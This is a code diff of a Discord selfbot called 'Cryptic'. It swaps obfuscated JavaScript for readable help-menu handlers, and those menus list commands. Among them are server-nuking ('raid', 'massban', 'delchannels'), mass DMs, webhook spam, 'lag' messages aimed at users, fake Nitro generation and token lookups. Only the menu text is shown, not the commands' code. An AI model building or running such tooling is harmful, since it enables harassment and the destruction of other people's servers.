-            \`\`\``);}if(_0x390a85===_0x1be328(0x520,0x581)){console[_0x1be328(0x6da,0x67e)]('['+colors[_0x1be328(0x57b,0x56b)](moment()[_0x1be328(0x4bf,0x429)]()[_0x1be328(0x6ed,0x800)](_0x1be328(0x5fa,0x575)))+']\x20'+colors[_0x1be328(0x632,0x76a)](_0x1be328(0x596,0x67d))+'\x20'+colors[_0x1be328(0x5db,0x696)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x632)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x760)]&&_0x1b369a[_0x1be328(0x594,0x440)]();if(enabled===!![]){let _0x37ff63=new Discord['RichEmbed']()[_0x1be328(0x4a2,0x455)](_0x1be328(0x755,0x7f5))[_0x1be328(0x5d3,0x68c)](image?image:_0x1be328(0x56d,0x6bb))['setColor'](color?color:_0x1be328(0x4c1,0x618))[_0x1be328(0x69b,0x6bf)](footer?footer:_0x1be328(0x524,0x68c))[_0x1be328(0x76c,0x8cf)]('\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<>\x20=\x20required\x20|\x20[]\x20=\x20optional\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**'+_0x32f547+_0x1be328(0x6a4,0x79c)+_0x32f547+_0x1be328(0x57a,0x465)+_0x32f547+'lag\x20<user-id>\x20<amount>**\x20»\x20Sends\x20the\x20user\x20the\x20specified\x20amount\x20of\x20lag\x20messages\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**'+_0x32f547+_0x1be328(0x63d,0x595)+_0x32f547+_0x1be328(0x5d9,0x5c0));_0x1b369a['channel'][_0x1be328(0x4c0,0x53e)](_0x37ff63);}else _0x1b369a[_0x1be328(0x49d,0x331)][_0x1be328(0x4c0,0x529)](stripIndents`\`\`\`
+            **${prefix}clean <amount>** » Deletes the specified amount of your messages
+            **${prefix}codeblock <type> <code>** » Converts your text to a code block
+            **${prefix}eval <code>** » Evaluates JavaScript code
+            **${prefix}hastebin <message>** » Sends your message to a hastebin
+            **${prefix}massreact <emoji>** » Adds a reaction to all cached messages in the channel
+            **${prefix}snipe [page-num]** » Snipes the recently deleted message
+            `)
+            message.channel.send(embed)
+        } else {
+            message.channel.send(stripIndents`\`\`\`
+            <> = required | [] = optional
+
+            ${prefix}clean <amount> » Deletes the specified amount of your messages
+            ${prefix}codeblock <type> <code> » Converts your text to a code block
+            ${prefix}eval <code> » Evaluates JavaScript code
+            ${prefix}massreact <message> » Sends your message to a haste bin
+            ${prefix}snipe [page-num] » Snipes the recently deleted message${footer ? `\n\n${footer}` : null}
+            \`\`\``)
+        }
+    }
+    
+    if(cmd === "help") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setTitle("Available Commands")
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setDescription(`
+            <> = required | [] = optional
+
+            **${prefix}animals** » Animals Commands
+            **${prefix}account** » Account Commands
+            **${prefix}abusive** » Nuke Commands
+            **${prefix}fun** » Fun Commands
+            **${prefix}info** » Info Commands
+            **${prefix}moderation** » Moderation Commands
+            **${prefix}status** » Status Commands
+            **${prefix}troll** » Troll Commands
+            **${prefix}text** » Text Commands
+            **${prefix}face** » Face Commands
+            **${prefix}utility** » Utility Commands
+            `)
+            message.channel.send(embed)
+        } else {
+            message.channel.send(stripIndents`\`\`\`
+            <> = required | [] = optional
+
+            ${prefix}animals » Animals Commands
+            ${prefix}account » Account Commands
+            ${prefix}abusive » Nuke Commands
+            ${prefix}fun » Fun Commands
+            ${prefix}info » Info Commands
+            ${prefix}moderation » Moderation Commands
+            ${prefix}status » Status Commands
+            ${prefix}troll » Troll Commands
+            ${prefix}face » Face Commands
+            ${prefix}utility » Utility Commands${footer ? `\n\n${footer}` : null}
+            \`\`\``)
+        }
+    }
+
+    if(cmd === "troll") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+      if(message.deletable) {
+          message.delete()
+      }
+      if(enabled === true) {
+          let embed = new Discord.RichEmbed()
+          .setTitle("Troll Commands")
+          .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+          .setColor(color ? color : "#1B78E7")
+          .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+          .setDescription(`
+          <> = required | [] = optional
+
+          **${prefix}ghostping <channel-id> <user-id>** » Ghostpings the user in the channel [GUILD ONLY]
+          **${prefix}hack <user-id>** » Hacks the user
+          **${prefix}lag <user-id> <amount>** » Sends the user the specified amount of lag messages
+          **${prefix}nitro** » Generates a random discord nitro code
+          **${prefix}fakenitro <user-id>** » Sends the user a discor nitro rick roll
+          `)
+          message.channel.send(embed)
+      } else {
+          message.channel.send(stripIndents`\`\`\`
           Troll Commands
 
           <> = required | [] = optional
 
-          ${_0x32f547}ghostping <channel-id> <user-id> » Ghostpings the user in the channel [GUILD ONLY]
-          ${_0x32f547}hack <user-id> » Hacks the user
-          ${_0x32f547}nitro » Generates a random discord nitro code
-          ${_0x32f547}fakenitro <user-id> » Sends the user a discor nitro rick roll${footer?'\x0a\x0a'+footer:null}
-          \`\`\``);}if(_0x390a85===_0x1be328(0x4f9,0x39c)){console[_0x1be328(0x6da,0x7d2)]('['+colors[_0x1be328(0x57b,0x4ac)](moment()[_0x1be328(0x4bf,0x3b9)]()[_0x1be328(0x6ed,0x655)](_0x1be328(0x5fa,0x56a)))+']\x20'+colors[_0x1be328(0x632,0x7aa)](_0x1be328(0x596,0x589))+'\x20'+colors[_0x1be328(0x5db,0x6de)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x73b)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x56e)]&&_0x1b369a[_0x1be328(0x594,0x703)]();if(enabled===!![]){let _0x512f6f=new Discord[(_0x1be328(0x508,0x4e1))]()[_0x1be328(0x4a2,0x45d)](_0x1be328(0x511,0x487))[_0x1be328(0x5d3,0x6b1)](image?image:_0x1be328(0x56d,0x698))[_0x1be328(0x5aa,0x70c)](color?color:_0x1be328(0x4c1,0x5f6))[_0x1be328(0x69b,0x60d)](footer?footer:_0x1be328(0x524,0x4db))[_0x1be328(0x76c,0x6e1)](_0x1be328(0x5b2,0x641)+_0x32f547+_0x1be328(0x641,0x5f9)+_0x32f547+_0x1be328(0x719,0x60a)+_0x32f547+_0x1be328(0x531,0x5ab)+_0x32f547+_0x1be328(0x496,0x57a)+_0x32f547+_0x1be328(0x5df,0x660)+_0x32f547+_0x1be328(0x66d,0x57d)+_0x32f547+_0x1be328(0x4b2,0x53e)+_0x32f547+_0x1be328(0x72b,0x65f));_0x1b369a[_0x1be328(0x49d,0x4dc)]['send'](_0x512f6f);}else _0x1b369a[_0x1be328(0x49d,0x423)][_0x1be328(0x4c0,0x463)](stripIndents`\`\`\`
+          ${prefix}ghostping <channel-id> <user-id> » Ghostpings the user in the channel [GUILD ONLY]
+          ${prefix}hack <user-id> » Hacks the user
+          ${prefix}nitro » Generates a random discord nitro code
+          ${prefix}fakenitro <user-id> » Sends the user a discor nitro rick roll${footer ? `\n\n${footer}` : null}
+          \`\`\``)
+      }
+  }
+
+    if(cmd === "info") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setTitle("Info Commands")
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setDescription(`
+            <> = required | [] = optional
+
+            **${prefix}botinfo** » Shows information on the Cryptic selfbot
+            **${prefix}catfact** » Random cat fact
+            **${prefix}dogfact** » Random dog fact
+            **${prefix}foxfact** » Random fox fact
+            **${prefix}help** » Shows a list of command categories
+            **${prefix}serverinfo** » Shows the servers information [GUILD ONLY]
+            **${prefix}tokeninfo <token>** » Gets information on that token
+            **${prefix}whois [user]** » Shows information on the mentioned user [GUILD ONLY]
+            `)
+            message.channel.send(embed)
+        } else {
+            message.channel.send(stripIndents`\`\`\`
             Info Commands
 
             <> = required | [] = optional
 
-            ${_0x32f547}botinfo » Shows information on the Cryptic selfbot
-            ${_0x32f547}catfact » Random cat fact
-            ${_0x32f547}dogfact » Random dog fact
-            ${_0x32f547}foxfact » Random fox fact
-            ${_0x32f547}help » Shows a list of command categories
-            ${_0x32f547}serverinfo » Shows the servers information [GUILD ONLY]
-            ${_0x32f547}tokeninfo <token> » Gets information on that token
-            ${_0x32f547}whois [user] » Shows information on the mentioned user [GUILD ONLY]${footer?'\x0a\x0a'+footer:null}
-            \`\`\``);}if(_0x390a85===_0x1be328(0x6df,0x6be)){console[_0x1be328(0x6da,0x858)]('['+colors[_0x1be328(0x57b,0x656)](moment()[_0x1be328(0x4bf,0x3eb)]()[_0x1be328(0x6ed,0x67d)]('HH:mm:ss'))+']\x20'+colors[_0x1be328(0x632,0x741)](_0x1be328(0x596,0x4fb))+'\x20'+colors[_0x1be328(0x5db,0x4e3)]('|')+'\x20'+colors['yellow'](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x64f)]&&_0x1b369a[_0x1be328(0x594,0x5fd)]();if(enabled===!![]){let _0x11c58b=new Discord[(_0x1be328(0x508,0x622))]()[_0x1be328(0x4a2,0x418)](_0x1be328(0x52b,0x414))[_0x1be328(0x5d3,0x764)](image?image:_0x1be328(0x56d,0x679))[_0x1be328(0x5aa,0x5ca)](color?color:_0x1be328(0x4c1,0x3c2))[_0x1be328(0x69b,0x7b2)](footer?footer:_0x1be328(0x524,0x576))['setDescription'](_0x1be328(0x5b2,0x55b)+_0x32f547+_0x1be328(0x559,0x3ff)+_0x32f547+_0x1be328(0x743,0x766)+_0x32f547+_0x1be328(0x71f,0x8a4)+_0x32f547+_0x1be328(0x6de,0x6e5));_0x1b369a[_0x1be328(0x49d,0x499)][_0x1be328(0x4c0,0x33c)](_0x11c58b);}else _0x1b369a[_0x1be328(0x49d,0x50c)][_0x1be328(0x4c0,0x4ef)](stripIndents`\`\`\`
+            ${prefix}botinfo » Shows information on the Cryptic selfbot
+            ${prefix}catfact » Random cat fact
+            ${prefix}dogfact » Random dog fact
+            ${prefix}foxfact » Random fox fact
+            ${prefix}help » Shows a list of command categories
+            ${prefix}serverinfo » Shows the servers information [GUILD ONLY]
+            ${prefix}tokeninfo <token> » Gets information on that token
+            ${prefix}whois [user] » Shows information on the mentioned user [GUILD ONLY]${footer ? `\n\n${footer}` : null}
+            \`\`\``)
+        }
+    }
+
+    if(cmd === "face") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setTitle("Face Commands")
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setDescription(`
+            <> = required | [] = optional
+
+            **${prefix}lenny** » Sends ( ͡° ͜ʖ ͡°) into the current channel
+            **${prefix}flip** » Sends (╯°□°）╯︵ ┻━┻ into the current channel
+            **${prefix}unflip** » Sends ┬─┬ ノ( ゜-゜ノ) into the current channel
+            **${prefix}shrug** » Sends ¯\\_(ツ)_/¯ into the current channel
+            `)
+            message.channel.send(embed)
+        } else {
+            message.channel.send(stripIndents`\`\`\`
             Face Commands
 
             <> = required | [] = optional
 
-            ${_0x32f547}lenny » Sends ( ͡° ͜ʖ ͡°) into the current channel
-            ${_0x32f547}flip » Sends (╯°□°）╯︵ ┻━┻ into the current channel
-            ${_0x32f547}unflip » Sends ┬─┬ ノ( ゜-゜ノ) into the current channel
-            ${_0x32f547}shrug » Sends ¯\\_(ツ)_/¯ into the current channel${footer?'\x0a\x0a'+footer:null}
-            \`\`\``);}if(_0x390a85===_0x1be328(0x4ea,0x370)){console[_0x1be328(0x6da,0x82e)]('['+colors[_0x1be328(0x57b,0x40b)](moment()[_0x1be328(0x4bf,0x547)]()['format'](_0x1be328(0x5fa,0x6f5)))+']\x20'+colors[_0x1be328(0x632,0x7a5)](_0x1be328(0x596,0x5cf))+'\x20'+colors[_0x1be328(0x5db,0x584)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x592)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x7c7)]&&_0x1b369a['delete']();if(enabled===!![]){let _0xa9193b=new Discord[(_0x1be328(0x508,0x4d2))]()[_0x1be328(0x4a2,0x58d)](_0x1be328(0x79e,0x77b))[_0x1be328(0x5d3,0x496)](image?image:'https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif')[_0x1be328(0x5aa,0x671)](color?color:_0x1be328(0x4c1,0x52e))[_0x1be328(0x69b,0x562)](footer?footer:_0x1be328(0x524,0x401))[_0x1be328(0x76c,0x85d)]('\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<>\x20=\x20required\x20|\x20[]\x20=\x20optional\x0a\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**'+_0x32f547+_0x1be328(0x65d,0x5ec)+_0x32f547+_0x1be328(0x765,0x703)+_0x32f547+_0x1be328(0x52d,0x617)+_0x32f547+_0x1be328(0x64e,0x647)+_0x32f547+_0x1be328(0x565,0x445));_0x1b369a[_0x1be328(0x49d,0x358)][_0x1be328(0x4c0,0x55c)](_0xa9193b);}else _0x1b369a[_0x1be328(0x49d,0x43e)][_0x1be328(0x4c0,0x5ca)](stripIndents`\`\`\`
+            ${prefix}lenny » Sends ( ͡° ͜ʖ ͡°) into the current channel
+            ${prefix}flip » Sends (╯°□°）╯︵ ┻━┻ into the current channel
+            ${prefix}unflip » Sends ┬─┬ ノ( ゜-゜ノ) into the current channel
+            ${prefix}shrug » Sends ¯\\_(ツ)_/¯ into the current channel${footer ? `\n\n${footer}` : null}
+            \`\`\``)
+        }
+    }
+
+  if(cmd === "status") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+      if(message.deletable) {
+          message.delete()
+      }
+      if(enabled === true) {
+          let embed = new Discord.RichEmbed()
+          .setTitle("Status Commands")
+          .setThumbnail(image ? image : "https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif")
+          .setColor(color ? color : "#1B78E7")
+          .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+          .setDescription(`
+          <> = required | [] = optional
+      
+          **${prefix}listening <message>** » Sets your activity as listening with your message
+          **${prefix}playing <message>** » Sets your activity as playing with your message
+          **${prefix}stream <message>** » Sets your activity as streaming with your message
+          **${prefix}watching <message>** » Sets your activity as watching with your message
+          **${prefix}reset** » Resets your current activity
+          `)
+          message.channel.send(embed)
+      } else {
+          message.channel.send(stripIndents`\`\`\`
           Status Commands
 
           <> = required | [] = optional
       
-          ${_0x32f547}listening <message> » Sets your activity as listening with your message
-          ${_0x32f547}playing <message> » Sets your activity as playing with your message
-          ${_0x32f547}stream <message> » Sets your activity as streaming with your message
-          ${_0x32f547}watching <message> » Sets your activity as watching with your message
-          ${_0x32f547}reset » Resets your current activity${footer?'\x0a\x0a'+footer:null}
-          \`\`\``);}if(_0x390a85===_0x1be328(0x737,0x6c8)){console[_0x1be328(0x6da,0x757)]('['+colors[_0x1be328(0x57b,0x4e9)](moment()['utc']()['format'](_0x1be328(0x5fa,0x4da)))+']\x20'+colors[_0x1be328(0x632,0x5fc)](_0x1be328(0x596,0x608))+'\x20'+colors[_0x1be328(0x5db,0x700)]('|')+'\x20'+colors['yellow'](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x665)]&&_0x1b369a[_0x1be328(0x594,0x5e4)]();if(enabled===!![]){let _0x39f0d4=new Discord[(_0x1be328(0x508,0x3bf))]()[_0x1be328(0x4a2,0x4dd)](_0x1be328(0x602,0x716))['setThumbnail'](image?image:_0x1be328(0x56d,0x483))[_0x1be328(0x5aa,0x484)](color?color:'#1B78E7')[_0x1be328(0x69b,0x7f4)](footer?footer:_0x1be328(0x524,0x69a))[_0x1be328(0x76c,0x6f1)]('\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<>\x20=\x20required\x20|\x20[]\x20=\x20optional\x0a\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**'+_0x32f547+_0x1be328(0x6f0,0x7b8)+_0x32f547+_0x1be328(0x52a,0x461)+_0x32f547+'fox**\x20»\x20Random\x20fox\x20image\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20');_0x1b369a['channel'][_0x1be328(0x4c0,0x40b)](_0x39f0d4);}else _0x1b369a[_0x1be328(0x49d,0x488)]['send'](stripIndents`\`\`\`
+          ${prefix}listening <message> » Sets your activity as listening with your message
+          ${prefix}playing <message> » Sets your activity as playing with your message
+          ${prefix}stream <message> » Sets your activity as streaming with your message
+          ${prefix}watching <message> » Sets your activity as watching with your message
+          ${prefix}reset » Resets your current activity${footer ? `\n\n${footer}` : null}
+          \`\`\``)
+      }
+  }
+
+  if(cmd === "animals") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+      if(message.deletable) {
+          message.delete()
+      }
+      if(enabled === true) {
+          let embed = new Discord.RichEmbed()
+          .setTitle("Animal Commands")
+          .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+          .setColor(color ? color : "#1B78E7")
+          .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+          .setDescription(`
+          <> = required | [] = optional
+      
+          **${prefix}cat** » Random cat image
+          **${prefix}dog** » Random dog image
+          **${prefix}fox** » Random fox image
+          `)
+          message.channel.send(embed)
+      } else {
+          message.channel.send(stripIndents`\`\`\`
           Animal Commands
 
           <> = required | [] = optional
       
-          ${_0x32f547}cat » Random cat image
-          ${_0x32f547}dog » Random dog image
-          ${_0x32f547}fox » Random fox image${footer?'\x0a\x0a'+footer:null}
-          \`\`\``);}if(_0x390a85===_0x1be328(0x506,0x55e)){console[_0x1be328(0x6da,0x6d5)]('['+colors['green'](moment()[_0x1be328(0x4bf,0x43a)]()[_0x1be328(0x6ed,0x87b)]('HH:mm:ss'))+']\x20'+colors[_0x1be328(0x632,0x510)](_0x1be328(0x596,0x692))+'\x20'+colors[_0x1be328(0x5db,0x65b)]('|')+'\x20'+colors['yellow'](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x77c)]&&_0x1b369a[_0x1be328(0x594,0x62a)]();if(enabled===!![]){let _0x5bfb17=new Discord[(_0x1be328(0x508,0x4e1))]()[_0x1be328(0x4a2,0x44c)](_0x1be328(0x595,0x5bb))[_0x1be328(0x5d3,0x607)](image?image:_0x1be328(0x56d,0x597))[_0x1be328(0x5aa,0x6ca)](color?color:_0x1be328(0x4c1,0x508))[_0x1be328(0x69b,0x7b9)](footer?footer:_0x1be328(0x524,0x5d3))[_0x1be328(0x76c,0x7c2)](_0x1be328(0x58d,0x51e)+_0x32f547+_0x1be328(0x4fd,0x3f7)+_0x32f547+_0x1be328(0x6f5,0x591)+_0x32f547+_0x1be328(0x79a,0x6d4)+_0x32f547+_0x1be328(0x4c2,0x655)+_0x32f547+'masschannels**\x20»\x20Creates\x20a\x20whole\x20bunch\x20of\x20random\x20channels\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**'+_0x32f547+_0x1be328(0x52f,0x63c)+_0x32f547+_0x1be328(0x5a2,0x4dd)+_0x32f547+_0x1be328(0x65f,0x4dc)+_0x32f547+_0x1be328(0x6c2,0x666)+_0x32f547+_0x1be328(0x774,0x5f1)+_0x32f547+'raid**\x20»\x20Changes\x20the\x20server\x20name,\x20icon,\x20creates\x20100\x20roles\x20and\x20makes\x20100\x20text\x20and\x20voice\x20channels\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**'+_0x32f547+_0x1be328(0x4b1,0x5c7)+_0x32f547+_0x1be328(0x77e,0x8b9)+_0x32f547+_0x1be328(0x620,0x503));_0x1b369a[_0x1be328(0x49d,0x353)][_0x1be328(0x4c0,0x53e)](_0x5bfb17);}else _0x1b369a[_0x1be328(0x49d,0x470)][_0x1be328(0x4c0,0x4b1)](_0x1be328(0x74f,0x63e)+_0x32f547+_0x1be328(0x6b1,0x55f)+_0x32f547+_0x1be328(0x75b,0x6fd)+_0x32f547+_0x1be328(0x790,0x80d)+_0x32f547+_0x1be328(0x7a0,0x8c0)+_0x32f547+_0x1be328(0x73d,0x7c2)+_0x32f547+_0x1be328(0x4f3,0x67f)+_0x32f547+_0x1be328(0x4e8,0x62a)+_0x32f547+_0x1be328(0x6a8,0x58e)+_0x32f547+_0x1be328(0x723,0x7b1)+_0x32f547+'original\x20»\x20Resets\x20the\x20entire\x20server\x0a'+_0x32f547+_0x1be328(0x687,0x71b)+_0x32f547+_0x1be328(0x5b3,0x4cf)+_0x32f547+_0x1be328(0x62b,0x4d5)+_0x32f547+_0x1be328(0x4e3,0x5b1)+_0x32f547+_0x1be328(0x51e,0x68f)+(footer?'\x0a\x0a'+footer:null)+_0x1be328(0x5a6,0x5a9));}if(_0x390a85===_0x1be328(0x668,0x7b8)){console[_0x1be328(0x6da,0x715)]('['+colors[_0x1be328(0x57b,0x4e8)](moment()[_0x1be328(0x4bf,0x3d5)]()[_0x1be328(0x6ed,0x662)](_0x1be328(0x5fa,0x550)))+']\x20'+colors[_0x1be328(0x632,0x59a)](_0x1be328(0x596,0x50a))+'\x20'+colors[_0x1be328(0x5db,0x639)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x4a5)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x697)]&&_0x1b369a[_0x1be328(0x594,0x50a)]();if(enabled===!![]){let _0x59c1f9=new Discord[(_0x1be328(0x508,0x54f))]()[_0x1be328(0x4a2,0x5f3)](_0x1be328(0x54a,0x46b))['setThumbnail'](image?image:_0x1be328(0x56d,0x592))[_0x1be328(0x5aa,0x6cf)](color?color:_0x1be328(0x4c1,0x4c8))[_0x1be328(0x69b,0x679)](footer?footer:_0x1be328(0x524,0x5e1))[_0x1be328(0x76c,0x6bd)](_0x1be328(0x5c9,0x6bb)+_0x32f547+_0x1be328(0x797,0x6f3)+_0x32f547+_0x1be328(0x598,0x655)+_0x32f547+_0x1be328(0x744,0x799)+_0x32f547+_0x1be328(0x4ef,0x5d9)+_0x32f547+_0x1be328(0x729,0x8a9)+_0x32f547+'ban\x20<member>\x20[reason]**\x20»\x20Bans\x20the\x20mentioned\x20member\x20from\x20the\x20server\x0a\x20\x20\x20\x20\x20\x20\x20\x20**'+_0x32f547+_0x1be328(0x78d,0x7e9));_0x1b369a[_0x1be328(0x49d,0x60b)][_0x1be328(0x4c0,0x343)](_0x59c1f9);}else _0x1b369a[_0x1be328(0x49d,0x534)][_0x1be328(0x4c0,0x433)](stripIndents`\`\`\`
+          ${prefix}cat » Random cat image
+          ${prefix}dog » Random dog image
+          ${prefix}fox » Random fox image${footer ? `\n\n${footer}` : null}
+          \`\`\``)
+      }
+  }
+
+  if(cmd === "abuse") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+      if(message.deletable) {
+          message.delete()
+      }
+      if(enabled === true) {
+          let embed = new Discord.RichEmbed()
+          .setTitle("Abusive Commands [GUILD ONLY]")
+          .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+          .setColor(color ? color : "#1B78E7")
+          .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+          .setDescription(`
+          <> = required | [] = optional
+      
+          **${prefix}dmall** » Sends mostly everyone in the server a message of your choice
+          **${prefix}delchannels** » Deletes every-single channel in the server
+          **${prefix}delroles** » Deletes every-single role in the server
+          **${prefix}lag <user-id> <amount>** » Sends the user the specified amount of lag messages
+          **${prefix}masschannels** » Creates a whole bunch of random channels
+          **${prefix}massroles** » Creates a whole bunch of random roles
+          **${prefix}massban** » Bans everyone in the server (Not including the server owner or members with a higher rank/role)
+          **${prefix}masskick** » Kicks everyone in the server (Not including the server owner or members with a higher rank/role)
+          **${prefix}nitrogen <amount>** » Generates the amount of discord nitro codes
+          **${prefix}original** » Resets the entire server
+          **${prefix}raid** » Changes the server name, icon, creates 100 roles and makes 100 text and voice channels
+          **${prefix}spamall <message>** » Sends every channel a message
+          **${prefix}spam <amount> <message>** » Spams your message the specified amount of times
+          **${prefix}webhookspam <webhook-url> <true|false> <message>** » Spams the webhook 100 times with your message
+                    (true = mention everyone with your message, false = regular message without mention)`)
+          message.channel.send(embed)
+      } else {
+          message.channel.send(`\`\`\`
+Abusive Commands [GUILD ONLY]
+
+<> = required | [] = optional
+      
+${prefix}dmall » Sends mostly everyone in the server a message of your choice
+${prefix}delchannels » Deletes every-single channel in the server
+${prefix}delroles » Deletes every-single role in the server
+${prefix}lag <user-id> <amount> » Sends the user the specified amount of lag messages
+${prefix}masschannels » Creates a whole bunch of random channels
+${prefix}massroles » Creates a whole bunch of random roles
+${prefix}massban » Bans everyone in the server (Not including the server owner or members with a higher rank/role)
+${prefix}masskick » Kicks everyone in the server (Not including the server owner or members with a higher rank/role)
+${prefix}nitrogen <amount> » Generates the amount of discord nitro codes
+${prefix}original » Resets the entire server
+${prefix}raid » Changes the server name, icon, creates 100 roles and makes 100 text and voice channels
+${prefix}spamall <message> » Sends every channel a message
+${prefix}spam <amount> <message> » Spams your message the specified amount of times
+${prefix}webhookspam <webhook-url> <true|false> <message> » Spams the webhook 100 times with your message
+           (true = mention everyone with your message, false = regular message without mention)
+${prefix}webhookraid <amount> <message> » Spams @everyone the amount of times with your message
+         (Must have webhook url in the config file)${footer ? `\n\n${footer}` : null}
+          \`\`\``)
+      }
+  }
+
+  if(cmd === "moderation") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+    if(message.deletable) {
+      message.delete()
+    }
+    if(enabled === true) {
+      let embed = new Discord.RichEmbed()
+      .setTitle("Moderation Commands [GUILD ONLY]")
+      .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+      .setColor(color ? color : "#1B78E7")
+      .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+      .setDescription(`
+        <> = required | [] = optional
+      
+        **${prefix}addrole <role> <member>** » Gives the mentioned role to the mentioned member
+        **${prefix}createrole <hex-color> <name>** » Creates a new role with the color
+        **${prefix}deleterole <name>** » Delets the role from the server
+        **${prefix}rainbow <role>** » Edits that role to rainbow colors
+        **${prefix}removerole <role> <member>** » Removes the mentioned role from the mentioned member
+        **${prefix}ban <member> [reason]** » Bans the mentioned member from the server
+        **${prefix}kick <member> [reason]** » Kicks the mentioned member from the server
+        `)
+        message.channel.send(embed)
+    } else {
+      message.channel.send(stripIndents`\`\`\`
       Moderation Commands [GUILD ONLY]
 
       <> = required | [] = optional
       
-        ${_0x32f547}addrole <role> <member> » Gives the mentioned role to the mentioned member
-        ${_0x32f547}createrole <hex-color> <name> » Creates a new role with the color
-        ${_0x32f547}deleterole <name> » Delets the role from the server
-        ${_0x32f547}rainbow <role> » Edits that role to rainbow colors
-        ${_0x32f547}removerole <role> <member> » Removes the mentioned role from the mentioned member
-        ${_0x32f547}ban <member> [reason] » Bans the mentioned member from the server
-        ${_0x32f547}kick <member> [reason] » Kicks the mentioned member from the server${footer?'\x0a\x0a'+footer:null}
